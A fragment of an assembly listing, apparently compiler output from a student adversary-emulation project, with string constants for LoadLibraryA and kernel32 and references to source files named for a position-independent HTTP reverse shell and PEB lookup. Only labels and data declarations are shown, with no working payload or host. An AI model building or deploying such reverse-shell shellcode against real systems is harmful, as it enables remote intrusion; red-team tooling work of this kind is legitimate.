...
PUBLIC	kernel32_str
_TEXT	SEGMENT
load_lib_str DB	'LoadLibraryA', 00H
	ORG $+3
kernel32_str DB	'k', 00H, 'e', 00H, 'r', 00H, 'n', 00H, 'e', 00H, 'l', 00H
...
_GetProcAddress$ = 224
main	PROC
; File F:\capstone-adversary-emulation-tool\Implementation\Code\Trying Something\PIC_httpreverse_shell.c
; Line 14
$LN7:
...
; File F:\capstone-adversary-emulation-tool\Implementation\Code\Trying Something\peb-lookup.h
; Line 104
$LN13:
